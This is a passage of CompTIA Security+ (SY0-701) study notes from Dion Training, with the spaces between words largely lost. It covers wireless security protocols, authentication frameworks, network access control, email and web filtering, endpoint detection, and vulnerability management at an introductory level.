+● WirelessSecuritySettings○ WirelessSecuritySettings■ Crucialforsecuringwirelessnetworksduetoincreasingusage○ WirelessEncryption■ Wirelessencryptionisessentialfordataconfidentialityinwirelessnetworks○ WEP(WiredEquivalentPrivacy)■ Introducedin1999aspartofIEEE802.11■ Utilizesastaticencryptionkeysystem■ Consideredinsecureduetoitsweak24-bitinitializationvector○ WPA(Wi-FiProtectedAccess)■ Introducedin2003asanimprovementoverWEP■ ImplementedTKIPfordynamickeygeneration■ InheritedsomevulnerabilitiesfromWEP■ DuetoTKIPvulnerabilities,itwassusceptibletocryptographicattacks
+
+302https://www.DionTraining.com
+
+## Page 303
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ InsecureduetoinsufficientdataintegritychecksintheTKIPimplementation○ WPA2(Wi-FiProtectedAccess2)■ Introducedin2004,replacingWPA.■ UsesAESprotocolandCCMPprotocolforstrongerencryption● AES-AdvancedEncryptionStandard● CCMP-CounterCipherModewithBlockChainingMessage
+
+AuthenticationCode■ IntroducedMessageIntegrityCode(MIC)forintegritychecking○ WPA3(Wi-FiProtectedAccess3)■ Thelatestandmostsecurewirelesssecurityprotocol.■ UsesAESforencryptionandintroducesnewfeatures.■ Features● SimultaneousAuthenticationofEquals(SAE)○ Replacesthe4-wayhandshakewithaDiffie-Hellmankey
+
+agreement○ Protectsagainstofflinedictionaryattacks● EnhancedOpen(OpportunisticWirelessEncryption)○ Providesindividualizeddataencryptioneveninopennetworks○ ImprovesprivacyandsecurityinopenWi-Fiscenarios● UpdatedCryptographicProtocols○ AESGCMPreplacesAESCCMPusedinWPA2○ Supportsboth128-bitand192-bitAESforenhancedsecurity● ManagementFrameProtection○ Ensurestheintegrityofnetworkmanagementtraffic○ Preventseavesdropping,forging,andtamperingwith
+
+managementframes
+
+303https://www.DionTraining.com
+
+## Page 304
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ AAAProtocols■ Importantforcentralizeduserauthenticationandaccesscontrol■ Examples● RADIUS(RemoteAuthenticationDial-InUserService)○ OffersAuthentication,Authorization,andAccountingservices○ Widelyusedforsecureaccesstonetworkresources● TACACS+(TerminalAccessControllerAccess-ControlSystemPlus)○ SeparatesAuthentication,Authorization,andAccounting
+
+functions○ Moregranularcontrol○ EncryptstheauthenticationprocessusingTCPforenhanced
+
+security○ AuthenticationProtocols■ Usedtoverifyuseridentityandcontrolnetworkaccess■ EAP(ExtensibleAuthenticationProtocol)● Authenticationframeworksupportingmultiplemethods● Providescommonfunctionsandnegotiationofauthenticationprotocols■ PEAP(ProtectedExtensibleAuthenticationProtocol)● EncapsulatesEAPwithinanencryptedTLStunnel● DevelopedjointlybyCiscoSystems,Microsoft,andRSASecurity■ EAP-TTLS(ExtensibleAuthenticationProtocol-TunneledTransportLayerSecurity)● ExtendsTLSsupportacrossplatforms● Requiresserver-sidecertificatesforsecurity■ EAP-FAST(ExtensibleAuthenticationProtocol-FlexibleAuthenticationviaSecure
+
+Tunneling)● DevelopedbyCiscoSystemsforsecurere-authentication
+
+304https://www.DionTraining.com
+
+## Page 305
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● UsesaProtectedAccessCredentialandTLStunnel
+
+● ApplicationSecurity○ ApplicationSecurity■ Focusesonbuildingsecureapplications■ Aimstoprevent,detect,andremediatesecurityvulnerabilities○ SixKeyAreasinApplicationSecurity■ InputValidation● Ensuresthatapplicationsprocesswell-defined,securedata● Guardsagainstattacksexploitingdatainputvulnerabilities(e.g.,SQL
+
+injection,XSS,bufferoverflows)● Servesasakindofqualitycontrolfordatatoensurethateverypieceof
+
+informationisvalid,secure,andcorrectlyformatted● ValidationRules○ Delineateacceptableandunacceptableinputs● Validatesdataearlyintheprocess(front-endvalidation)● Usedwithadditionaltoolsfordefensein-depth○ Securecommunicationprotocols○ Regularsecurityauditing○ Implementingpropererrorhandling■ Cookies● Smalldatapiecesstoredbywebbrowsers● Maintainstatefulinformationbetweentheserverandclient● SecureCookies○ SecurecookiesaretransmittedoverHTTPSforenhancedsecurity
+
+305https://www.DionTraining.com
+
+## Page 306
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Bestpractices○ Refrainingfrompersistentcookiesforsessionverification○ EnablingtheSecureattribute○ EnablingHttpOnlyattribute○ ConfiguringtheSameSiteattribute■ StaticCodeAnalysis(SAST)● Amethodofdebugginganapplicationbyreviewingandexaminingits
+
+sourcecodebeforerunningtheprogram● Identifiesissueslikebufferoverflows,SQLinjection,andXSS● Importantforproperinputvalidationinbothfront-endandback-end
+
+code■ DynamicCodeAnalysis(DAST)● Analyzesapplicationswhiletheyrun● CommonmethodsofDAST○ Fuzzing(FuzzTesting)■ Inputsrandomdatatoprovokecrashesorexceptions■ Helpsuncoversecurityflawsandweaknesses○ StressTesting■ Evaluatessystemstabilityandreliabilityunderextreme
+
+conditions■ Revealsbottlenecksandassessessystemrecovery■ CodeSigning● Confirmsthesoftwareauthor'sidentityandintegrity● Utilizesdigitalsignaturestoverifycodeauthenticity● Protectsagainstcodetamperingbutdoesn'tguaranteeabsenceof
+
+vulnerabilities
+
+306https://www.DionTraining.com
+
+## Page 307
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Sandboxing● Isolatesrunningprograms,limitingtheiraccesstoresources● Preventsharmfulactionsonthehostdeviceornetwork● Usedtoexecuteuntrustedoruntestedprogramssecurely
+
+● NetworkAccessControl(NAC)○ NetworkAccessControl(NAC)■ Usedtoprotectnetworksfrombothknownandunknowndevicesbyscanning
+
+devicestoassesstheirsecuritystatusbeforegrantingnetworkaccess■ Canbeappliedtodeviceswithintheinternalnetworkorthoseconnecting
+
+remotelyviaVPN■ NACcanbeimplementedasahardwareorsoftwaresolution○ NACProcess■ Whenadeviceattemptstoconnect,itisplacedinavirtualholdingareafor
+
+scanning■ Scanningchecksvariousfactors,includingantivirusdefinitions,securitypatching,
+
+andpotentialsecuritythreats■ Ifadevicepassesinspection,itisallowednetworkaccess■ Ifadevicefailsinspection,itisplacedinadigitalquarantineareaforremediation○ NACAgentTypes■ PersistentAgents● Installedondevicesinacorporateenvironmentwheretheorganization
+
+- wnsandcontrolsdevicesoftware■ Non-PersistentAgents● Commoninenvironmentswithpersonaldevices(e.g.,collegecampuses);
+usersconnect,accessaweb-basedcaptiveportal,downloadanagentfor
+
+307https://www.DionTraining.com
+
+## Page 308
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+scanning,anddeleteitselfafterinspection○ 802.1xStandard■ Port-basedNetworkAccessControlmechanismbasedontheIEEE802.1x
+
+standard■ ModernNACsolutionsbuildon802.1x,enhancingfeaturesandcapabilities○ Rule-BasedAccessControl■ Inadditiontohealthpolicy,NACcanuserule-basedmethodsforaccesscontrol● Time-BasedFactors○ Defineaccessperiodsbasedontimeschedules;mayblockaccess
+
+duringnon-workinghours● Location-BasedFactors○ Evaluatetheendpoint'slocationusinggeolocationdatatodetect
+
+unusualloginlocations● Role-BasedFactors○ Reevaluatedeviceauthorizationbasedonitsrole(adaptiveNAC)● Rule-BasedFactors○ Implementcomplexadmissionpolicieswithlogicalstatementsto
+
+determineaccessbasedonconditions
+
+● WebandDNSFiltering○ WebFiltering■ Webfilteringorcontentfilteringisusedtocontrolorrestrictthecontentusers
+
+canaccessontheinternet■ Crucialforbusinesses,educationalinstitutions,andparentstoensuresafeand
+
+productiveinternetuse
+
+308https://www.DionTraining.com
+
+## Page 309
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Differenttypesofwebfilteringtechniques■ Agent-BasedWebFiltering● Involvesinstallinganagentoneachdevice● Monitorsandenforceswebusagepolicies● Effectiveforremoteandmobileworkers■ CentralizedProxy● Usesaproxyserverasanintermediarybetweenanorganization’send
+
+usersandtheInternet● Evaluatesandcontrolswebrequestsbasedonpolicies● Iftherequestdoesnotconformwiththepolicies,therequestissimply
+
+blockedordenied■ URLScanning● AnalyzeswebsiteURLstocheckformatchesinadatabaseofknown
+
+maliciouswebsites■ ContentCategorization● Classifieswebsitesintocategories(e.g.,socialmedia,adultcontent)and
+
+blocksorallowscategoriesbasedonpolicies■ BlockRules● Specificguidelinessetbyorganizationstopreventaccesstocertain
+
+websitesorcategories,oftenusedtoaddresssecuritythreats■ Reputation-BasedFiltering● Blocksorallowswebsitesbasedonareputationscoredeterminedby
+
+third-partyservices,consideringfactorslikehostingmalwareorphishing○ DNSFiltering■ DNSfiltering(DomainNameSystemfiltering)blocksaccesstospecificwebsites
+
+bypreventingthetranslationofdomainnamestotheirIPaddresses
+
+309https://www.DionTraining.com
+
+## Page 310
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Users'devicesrequestdomainnametranslationfromDNSservers;ifthedomain
+
+isontheblocklist,theserverwithholdstheIPaddresstopreventaccess■ Commonlyusedtoenforceinternetusagepolicies,blockinappropriatecontent,
+
+andprotectagainstmaliciouswebsites■ Oftenemployedbyschools,universities,andorganizationstoensuresafeand
+
+educationalinternetusage
+
+● EmailSecurity○ EmailSecurity■ Encompassestechniquesandprotocolstoprotectemailcontent,accounts,and
+
+infrastructurefromunauthorizedaccess,loss,orcompromise○ Keyemailsecuritytechniques■ DKIM(DomainKeysIdentifiedMail)● Allowsthereceivertoverifythesourceandintegrityofanemailby
+
+addingadigitalsignaturetotheemailheaders● TherecipientservervalidatestheDKIMsignatureusingthesender's
+
+publiccryptographickeyinthedomain'sDNSrecords● Benefits○ Emailauthentication○ Protectionagainstemailspoofing○ Improvedemaildeliverability○ Enhancedreputationscore■ SPF(SenderPolicyFramework)● Preventssenderaddressforgerybyverifyingthesender'sIPagainst
+
+authorizedIPslistedinthesender'sdomainDNSrecords● Areceivingserverchecksifthesender'sIPisauthorizedintheSPFrecord
+
+310https://www.DionTraining.com
+
+## Page 311
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+beforeacceptingtheemail● Benefits○ Preventingemailspoofing○ Improvingemaildeliverability○ Enhancingthedomain'sreputation■ DMARC(Domain-basedMessageAuthentication,ReportingandConformance)● DMARCdetectsandpreventsemailspoofingbysettingpoliciesforemail
+
+sendingandhandlingfailures● DMARCcanworkwithDKIM,SPF,orboth● Implementationhelpsprotectagainst○ Businessemailcompromiseattacks○ Phishing○ Scams○ Cyberthreats■ EmailGatewayProtocolConfiguration● Emailgatewaysserveasentryandexitpointsforemails,facilitating
+
+secureandefficientemailtransmission● TheyuseSMTP(SimpleMailTransferProtocol)tosendandreceiveemails● Emailgatewayshandleemailrouting,emailsecurity,policyenforcement,
+
+andemailencryption● EmailGatewayDeploymentOptions○ On-PremisesEmailGateway■ Aphysicalserverlocatedwithinanorganization's
+
+premises,offeringfullcontrolbutrequiringmaintenance
+
+andupdates
+
+311https://www.DionTraining.com
+
+## Page 312
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Cloud-BasedEmailGateway■ Hostedbythird-partycloudserviceproviders,providing
+
+scalabilitybutlimitedcontroloverconfigurations○ HybridEmailGateway■ Combineson-premisesandcloud-basedgatewaysfora
+
+balancebetweencontrolandconvenience○ SpamFiltering■ Spamfilteringdetectsandpreventsunwantedandunsolicitedemailsfrom
+
+reachingusers'inboxes■ Techniques● Contentanalysis● Bayesianfiltering● DNS-basedsinkholelist● Emailfilteringrules■ Emailswithspam-likekeywordsareflaggedandoftenmovedtothespamfolder
+
+● EndpointDetectionandResponse○ EndpointDetectionandResponse(EDR)■ Categoryofsecuritytoolsthatmonitorendpointandnetworkeventsandrecord
+
+theinformationinacentraldatabase■ Continuouslymonitoringandresponsetoadvancedthreats■ Monitorsendpointandnetworkevents,providingdataforthefollowing● Analysis● Detection● Investigation● Reporting
+
+312https://www.DionTraining.com
+
+## Page 313
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Alerting■ Focusesonincidentdataforenhancingsecuritymonitoring,incidentresponse,
+
+andforensicinvestigations○ HowEDRWorks■ DataCollection● Collectsdatafromendpoints(devicesthatarephysicallyontheendpoint
+
+- fanetwork)○ Systemprocesses○ Registrychanges○ Memoryusage○ Networktrafficpatterns■ DataConsolidation● Sendscollecteddatatoacentralizedsecuritysolutionordatabase■ ThreatDetection● Analyzesdatausingtechniqueslikesignature-basedandbehavioral-based
+detectiontoidentifythreats■ AlertsandThreatResponse● Takesactionssuchascreatingalertsorperformingthreatresponse
+
+actionswhenthreatsaredetected■ ThreatInvestigation● Providestoolsforsecurityteamstoinvestigatethreats,includingdetailed
+
+timelinesandforensicdata■ Remediation● Removingmaliciousfiles● Reversingchanges● Restoringsystemstotheirnormalstate
+
+313https://www.DionTraining.com
+
+## Page 314
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ FileIntegrityMonitoring(FIM)■ Validatestheintegrityofoperatingsystemandapplicationsoftwarefilesby
+
+comparingtheircurrentstatewithaknown,goodbaseline■ Identifieschangesto● Binaryfiles● SystemandApplicationFiles● ConfigurationandParameterFiles■ Monitorscriticalsystemfilesforchangesusingagentsandhashdigests,
+
+triggeringalertswhenunauthorizedchangesoccur○ ExtendedDetectionandResponse(XDR)■ Securitystrategythatintegratesmultipleprotectiontechnologiesintoasingle
+
+platform■ Improvesdetectionaccuracyandsimplifiedincidentresponse■ Correlatesdataacrossmultiplesecuritylayerstodetectthreatsfaster,including● email● endpoint● server● cloudworkloads● network○ DifferencebetweenEDRandXDR■ EDRisfocusedontheendpointstodetectandrespondtopotentialthreats■ XDRismorecomprehensivesolutionbecauseitfocusesonendpoints,butalso
+
+- nnetworks,cloud,andemailtodetectandrespondtopotentialthreats● Itintegratesmultipleprotectiontechnologies
+314https://www.DionTraining.com
+
+## Page 315
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● UserBehaviorAnalytics○ UserBehaviorAnalytics(UBA)■ Advancedcybersecuritystrategythatusesbigdataandmachinelearningto
+
+analyzeuserbehaviorsfordetectingsecuritythreats■ Focusesonunderstandinguserbehaviorwithinsystemsandnetworkstoidentify
+
+patternsandanomalies○ UserandEntityBehaviorAnalytics(UEBA)■ TechnologysimilartoUBAbutextendsthemonitoringofentitieslikerouters,
+
+servers,andendpointsinadditiontouseraccounts■ Enhancessecuritybyanalyzingbothuserandentitybehaviortodetect
+
+anomalies○ KeyAspectsofUBAandUEBA■ UBAleveragesdataanalyticstocollectandanalyzeuserbehaviordatato
+
+establishnormalbehaviorbaselines● Knowingthebaselinemakesiteasiertospotanomalies■ Machinelearningalgorithmsareusedtoidentifydeviationsfromnormal
+
+behavior,whichmayindicatesecuritythreats■ UBAsystemsprocessdatafromvarioussources● Networktraffic● Userdevices● Applicationlogs■ Alertsaregeneratedwhenanomaliesaredetected,whicharetheninvestigated
+
+bythesecurityteam○ BenefitsofUBAandUEBA■ EarlyDetectionofThreats● UBAtoolscanidentifypotentialthreatsbeforesignificantdamageoccurs,
+
+315https://www.DionTraining.com
+
+## Page 316
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+allowingforquickerandmoreeffectiveresponses■ InsiderThreatDetection● Effectiveatidentifyinginsiderthreatsbydetectingsuspiciousactivities
+
+thatdeviatefromtypicalbehavior■ ImprovedIncidentResponse● Providesdetailedinformationaboutuserbehavior,helpingsecurityteams
+
+respondeffectivelytoincidents,suchascompromisedcredentialsor
+
+unauthorizedactions
+
+● SelectingSecureProtocols○ SecureProtocols■ Choosesecureprotocolstoprotectdataintransitfromunauthorizedaccess● ExamplesincludeHTTPvs.HTTPS,FTPvs.SFTP,Telnetvs.SSH■ Secureprotocolsuseencryptiontosafeguarddataduringtransmission■ Telnet● Applicationlayerprotocolthatallowsauserononecomputertologonto
+
+anothercomputerthatispartofthesamenetwork● Transmitsinplaintext● UseSSHinstead■ Alwaysusetheencryptedversionoftheprotocol● Examples○ HTTPS○ SFTP○ SSH○ IMAPS○ POP3S
+
+316https://www.DionTraining.com
+
+## Page 317
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ SMTPS○ SNMPS○ PortSelection■ Portsarelogicalconstructsusedtoidentifyprocessesorservicesonasystem■ Categorizedintothefollowing● Well-knownports(0-1023)● Registeredports(1024-49151)● Dynamic/privateports(49152-65535)■ Defaultportnumbersoftenindicatewhetheraprotocolissecure(e.g.,HTTPon
+
+port80vs.HTTPSonport443)■ Additionalsecurityconsiderations● Followtheprincipleofleastprivilegebyopeningonlynecessaryportsto
+
+minimizetheattacksurface● Changingportnumberscanaddalayerofobscuritybutshouldnot
+
+replacerobustsecuritymeasures○ TransportMethods■ Chooseatransportmethod(TCPorUDP)basedontheapplication'sneeds■ TCP(TransmissionControlProtocol)● Connection-oriented,ensuringdatadeliverywithouterrors● Idealforapplicationswheredataaccuracyiscrucial,likewebandemail
+
+servers● Usesacknowledgments,retransmission,andsequencingfordataintegrity■ UDP(UserDatagramProtocol)● Connectionlessandfaster,butdoesn'tguaranteedatadelivery● Suitableforapplicationsprioritizingspeedoveraccuracy,likestreaming
+
+videoorgaming
+
+317https://www.DionTraining.com
+
+## Page 318
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+VulnerabilityManagement
+
+Objective4.3:Explainvariousactivitiesassociatedwithvulnerabilitymanagement
+
+● VulnerabilityManagement○ VulnerabilityManagement■ Systematicprocessforidentifying,evaluating,prioritizing,andmitigating
+
+vulnerabilities■ Goals● Maintainsecureandresilientcybersecurityposture,minimizesecurity
+
+breaches,andmanageriskeffectively○ StudyTopics■ IdentifyingVulnerabilities● Recognizingweaknessesinsystems,applications,andnetworks● Criticalfirststepforbuildingarobustsecurityposture■ ThreatIntelligenceFeeds● Provideessentialinformationonemergingthreats● Proactiveidentificationandmitigationofvulnerabilities■ ResponsibleDisclosurePrograms● Frameworkforethicalreportingofdiscoveredvulnerabilities● Fosteringcollaborationbetweensecurityresearchersandorganizations■ AnalyzingVulnerabilities● Evaluatingseverityandpotentialimpact● Prioritizingremediationeffortseffectively
+
+318https://www.DionTraining.com
+
+## Page 319
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ VulnerabilityScans● Employingscanningtoolsandmethodologies● Systematicallysearchingforvulnerabilities■ AssessingScanResults● Comprehensiveanalysisofgathereddata● Determiningvulnerabilitiesrequiringimmediateattention■ RespondingandRemediating● Developingeffectiveresponsestrategies● Promptlyaddressingandreducingexposuretopotentialthreats■ ValidatingRemediation● Ensuringremediationactionseffectivelymitigatevulnerabilities● Confirmingthesecurityofsystems■ VulnerabilityReporting● Communicatingfindingsandremediationprogress● Maintainingtransparencyandfacilitatingdecision-making
+
+● IdentifyingVulnerabilities○ IdentifyingVulnerabilities■ Systematicpracticeofrecognizingandcategorizingweaknessesinsystems,
+
+networks,orapplicationsthatcouldbeexploited■ Thisprocessiscrucialforenhancingsystemsecurity,preventingunauthorized
+
+access,andprotectingtheintegrityofanorganization'sdataandsystems○ MethodsforIdentifyingVulnerabilities■ VulnerabilityScanning● Automatedprobingofsystems,networks,andapplicationstodiscover
+
+potentialvulnerabilities
+
+319https://www.DionTraining.com
+
+## Page 320
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ToolslikeNessusandOpenVASareusedtoanalyzethecurrentstateof
+
+systemsagainstadatabaseofknownvulnerabilities● Prioritizeidentifiedvulnerabilities,applypatches,andimplement
+
+mitigationmeasurestopreventexploitation■ ApplicationSecurity● Protectingsoftwarefrommanipulationduringitslifecycle● Techniquesincludestaticanalysis,dynamicanalysis,andpackage
+
+monitoringforcustomsoftwareapplications○ Staticanalysisexaminesthesourcecodewithoutexecutionto
+
+identifyvulnerabilities○ Dynamicanalysisevaluatesapplicationsinreal-timetodetect
+
+vulnerabilities○ Packagemonitoringensuresthesecurityandupdatesoflibraries
+
+andcomponentsthatapplicationsdependon■ PenetrationTesting● Simulatesreal-worldattacksonsystemstoevaluatetheirsecurity● Examiningpenetrationtestresultstounderstandhowsystemswere
+
+infiltratedorexploited● Mitigateidentifiedissuestopreventsimilarattackvectorsfrombeing
+
+usedbyattackers■ SystemandProcessAudits● Comprehensivereviewsofinformationsystems,securitypolicies,and
+
+procedures● Ensuresadherencetosecuritybestpracticesandindustrystandards
+
+320https://www.DionTraining.com
+
+## Page 321
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ TheFour-StepProcessforIdentifyingVulnerabilities■ Planning● Establishpolicies,procedures,andmechanismstosystematicallytrack
+
+andevaluatevulnerabilities● Determinehowvulnerabilitytestingwillbeconductedandfixesdeployed■ Testing● Evaluatepatchesandupdatesinacontrolledenvironmentbefore
+
+deployingthemacrosstheentireenterprisenetwork● Verifythatsolutionstomitigatevulnerabilitiesdonotintroducenew
+
+issues■ Implementation● Deploypatchesandupdatesacrossdevicesandapplications● Appliestosmallandlargenetworkstomitigateidentifiedvulnerabilities■ Auditing● Ensurethatsecuritypatchesandconfigurationchangeshavebeen
+
+implementedeffectively● Verifythatnoissueshavearisenaftertheimplementationofchanges
+
+● ThreatIntelligenceFeeds○ ThreatIntelligenceFeeds■ Providevaluableinformationaboutpotentialorcurrentthreatstoan
+
+- rganization'ssecurity■ Continuousstreamsofdatarelatedtopotentialorcurrentthreats■ Collected,analyzed,anddisseminatedbysecurityresearchers,organizations,or
+automatedtools■ Providereal-timeornear-real-timeupdatesonaspectssuchas
+
+321https://www.DionTraining.com
+
+## Page 322
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Malwaresignatures● IndicatorsofCompromise(IoC)● MaliciousIPaddresses● URLs■ Differentfeedsourcesareusedtoenhancesecurityposture○ UnderstandingThreatIntelligence■ ThreatIntelligence● Continuousprocesstocomprehendthespecificthreatsanorganization
+
+faces■ Itfocusesonanalyzingevidence-basedknowledgeaboutexistingoremerging
+
+hazardstoanorganization'sassets■ Combinesdatafrommultiplesourcestoprovidecontext,mechanisms,
+
+indicators,implications,andactionableinformationaboutthreats■ ThreatintelligenceservicesfromcompanieslikeFireEyehelpcybersecurity
+
+professionalsstayupdatedonthelatestattacks,vulnerabilities,andthreats○ EvolutionofThreats■ Threatactorsadapttheirattackmethodsastechnologychanges■ Inthepast,server-sideattackswerecommonduetoopenportsandprotocolson
+
+servers■ Withbetterserverprotection,threatactorsshiftedtoclient-sideattacks,
+
+targetingvulnerabilitiesinclientapplications■ EnterprisenetworksimplementNetworkAccessControl(NAC)tosecureclients■ Themobileenvironmentandcloudtechnologyhavealsobecometargetsfor
+
+attacks
+
+322https://www.DionTraining.com
+
+## Page 323
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ SourcesofThreatIntelligence■ Open-SourceIntelligence(OSINT)● Collectedfrompubliclyavailablesourceslikereports,forums,news
+
+articles,blogs,andsocialmedia● Oftenavailableatnocost● Valuableforinsightsintoemergingthreatsandvulnerabilities● ExamplesincludefeedsfromAlienVaultOpenThreatExchange,SANS
+
+InternetStormCenter,andsecurityresearchforums■ ProprietaryorThird-PartyFeeds● Providedbycommercialvendorsunderasubscriptionmodel● Offermorerefined,analyzed,andtimelyinformation● Integratableintosecuritytoolsforautomatedthreatresponse● CompanieslikeFireEye,McAfee,andSymantecprovideproprietaryfeeds■ Information-SharingOrganizations● Formedtofacilitatethesharingofthreatintelligenceamongmembers● IncludesInformationSharingandAnalysisCentersandInformation
+
+SharingandAnalysisOrganizations● Collaborationamongbusinessesinspecificindustries(e.g.,finance,
+
+healthcare)toshareindustry-specificthreatinformation■ DarkWeb● Ahiddenpartoftheinternetinaccessiblethroughstandardbrowsers● Canbeasourceofthreatintelligenceforsecurityresearchers● Exploredforinformationabouthackingtechniques,stolendata,and
+
+emergingthreats● Providesinsightsaheadofpublicknowledge
+
+323https://www.DionTraining.com
+
+## Page 324
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ResponsibleDisclosurePrograms○ ResponsibleDisclosure■ Ethicalpracticefordisclosingvulnerabilitiesinsoftware,hardware,oronline
+
+services■ Thegoalistoprovidestakeholderstimetoaddressvulnerabilitiesbeforepublic
+
+disclosure■ Process● Securityresearcherprivatelynotifiestheorganization● Researcherandorganizationagreeonatimeframeforpublicdisclosure● Afteraddressingthevulnerabilityortheagreedtimeframe,the
+
+researcherdisclosestheinformationpublicly○ BugBountyPrograms■ Robustresponsibledisclosureprogramsincentivizingsecurityresearchers■ Offermonetaryrewardsforvalidatedvulnerabilities■ ProgramscanberuninternallyorfacilitatedthroughplatformslikeHackerOne,
+
+Bugcrowd,andSynack■ Benefits● Increasedsecuritythroughexternalscrutiny● Communitycollaboration● Cost-effectiveness(payforfoundvulnerabilities)■ Challenges● Clearcommunication● Legalprotections● Rulesofengagement○ BestPracticesforEffectivePrograms■ Clearlydefinetheprogram'sscope
+
+324https://www.DionTraining.com
+
+## Page 325
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Establishpropercommunicationchannelsforreporting■ Setuparewardstructurealignedwithvulnerabilityrisk■ Createlegalsafeguardsforsecurityresearchers■ Definetimeframesforvulnerabilityacknowledgment,validation,and
+
+remediation■ Promotetransparencytosharelessonslearnedwiththecommunityandindustry
+
+● AnalyzingVulnerabilities○ VulnerabilityConfirmation■ Determiningtheaccuracyofidentifiedpotentialsecurityweaknesses● TruePositive○ Realandexploitablevulnerabilitycorrectlyidentified● FalsePositive○ Incorrectlystatedvulnerability
+
+● TrueNegative○ Correctlyidentifiestheabsenceofavulnerability● FalseNegative○ Seriousfinding–vulnerabilityexistsbutremainsundetected○ PrioritizingVulnerabilities■ Rankingidentifiedvulnerabilitiesbyseverityandpotentialimpact■ Factorsincludeeaseofexploitation,potentialdamage,systemimportance■ UsescoringsystemslikeCommonVulnerabilityScoringSystem(CVSS)■ Ensurefocusonthemostcriticalsecuritythreats○ ClassifyingVulnerabilities■ Categorizingvulnerabilitiesbasedontype,potentialimpact,andaffected
+
+325https://www.DionTraining.com
+
+## Page 326
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+systems■ Streamlinesmanagementandresponseefforts■ Vulnerabilitiesmightbeclassifiedintocategoriessuchas● Softwareflaws● Configurationerrors● Securitypolicygaps■ CVE(CommonVulnerabilitiesandExposures)● Systemthatprovidesastandardizedwaytouniquelyidentifyand
+
+referenceknownvulnerabilitiesinsoftwareandhardware● Providessolutionsandmitigationstrategies● Helpassesssecurityandprioritizevulnerabilityfixes○ OrganizationalImpactofVulnerabilities■ Assessingpotentialimpactonconfidentiality,integrity,andavailability■ Considerindustry-specificimpact■ Impactonreputation,businesscontinuity,regulatoryfines,customertrust○ ExposureFactor(EF)■ Aquantifiablemetrictoestimatethepercentageofassetdamage■ Helpsunderstandpotentiallossduetovulnerabilityexploitation■ Supportsqualitativeriskmanagementintheorganization○ RiskTolerance■ Thelevelofriskanorganizationiswillingtoaccept■ Determinestheurgencyofvulnerabilityremediation■ Highrisktolerancemayallowmonitoringofcertainvulnerabilities■ Lowrisktolerancemayrequireswiftremediationofevenminorvulnerabilities■ Alignmentofvulnerabilitymanagementwithoverallbusinessstrategiesand
+
+- bjectives
+326https://www.DionTraining.com
+
+## Page 327
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● VulnerabilityResponseandRemediation○ VulnerabilityResponseandRemediation■ Involvesstrategiesandactionsforidentifying,assessing,andaddressing
+
+vulnerabilities■ Aimstomitigaterisksassociatedwithknownvulnerabilities○ Patching■ Processofapplyingupdatestofixsoftware,system,orapplicationvulnerabilities■ Patchesreleasedbysoftwarevendors■ Endusersmustupdatetheirsoftwaretoapplysecuritypatches○ InsurancePolicy■ Procuringacybersecurityinsurancepolicyasariskmanagementstrategy■ Mitigatesfinanciallossesresultingfromcyberincidents(databreach,network
+
+- utage,businessinterruption)■ Coversmitigation,remediation,recoverycosts,legalfees,publicrelations,and
+customernotification○ NetworkSegmentation■ Dividinganetworkintosmallersegmentstoimproveperformanceandsecurity■ Isolatessegmentsfromeachothertopreventthreatpropagation○ CompensatingControls■ Alternativesecuritymeasureswhenstandardcontrolscannotbeeffectively
+
+implemented■ Tailoredtoprovideequivalentprotection○ ExceptionandExemption■ Exception● Temporarilyrelaxingorbypassingsecuritycontrolsorpoliciesfor
+
+327https://www.DionTraining.com
+
+## Page 328
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+- perationalbusinessneeds,withanunderstandingofassociatedrisks■ Exemption● Apermanentwaiverofsecuritycontrolsorpoliciesduetospecific
+reasons,oftenforlegacysystems
+
+● ValidatingVulnerabilityRemediation○ Remediation■ Involveinstallingpatches,reconfiguringdevices,orotheractions○ RescanningDevices■ Conductpost-remediationscanstodouble-checkvulnerabilitymitigation■ Identifyanyremainingunaddressedvulnerabilities■ Detectnewvulnerabilitiesthatmayhaveemergedsincetheinitialscan■ Validatewhetherappliedpatcheseffectivelysolvedtheidentifiedvulnerabilities■ Suggestions● Scheduleautomaticre-scansandmaintainconsistencywithinitialscan
+
+conditions● Usecomprehensivescans● Replicateinitialscanconditions○ AuditingDevices■ Auditing● Involvessystematicreviewoflogs,configurations,andpatches● Ensuresalignmentwithestablishedsecuritystandardsandpolicies■ ConfigurationAuditing● Checksformisconfigurationsordeviations■ PatchAuditing● Confirmsproperapplicationandeffectivenessofpatches
+
+328https://www.DionTraining.com
+
+## Page 329
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Maintaindetailedrecordsofvulnerabilities,patches,andchanges■ Useautomatedauditingtoolsandincludecompliancechecksforindustry
+
+regulationsorstandards○ VerificationofDevices■ Verification● Finalstepinvalidatingremediation● Involvestestingsystemstoconfirmpatchesandconfigurationchanges■ Conductpenetrationteststoverifyvulnerabilityremediation■ UserVerification● Ensuresapplicationsandservicesarefunctioningcorrectly■ Establishfeedbackloopswithusersandstafftoidentifyandaddress
+
+post-remediationissues■ Perform● Holistictesting● Continuousmonitoring● Considerexternalauditorsforverification■ Verifyboththeresolutionofvulnerabilitiesandoverallsystemstabilityand
+
+functionality
+
